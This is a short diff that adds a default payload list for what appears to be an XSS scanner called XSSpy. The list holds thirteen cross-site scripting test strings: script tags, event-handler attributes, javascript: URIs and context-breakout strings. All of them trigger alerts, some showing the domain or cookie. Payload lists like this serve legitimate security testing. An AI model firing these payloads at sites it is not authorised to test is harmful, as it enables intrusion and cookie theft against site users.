@@ -1,0 +1,14 @@
+# XSSpy Default Payloads
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+<a href="javascript:alert('XSS')">click</a>
+<div onmouseover=alert('XSS')>hover</div>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(window.location)>
+"><script>alert('XSS')</script>
+';alert('XSS');//
+javascript:alert('XSS')
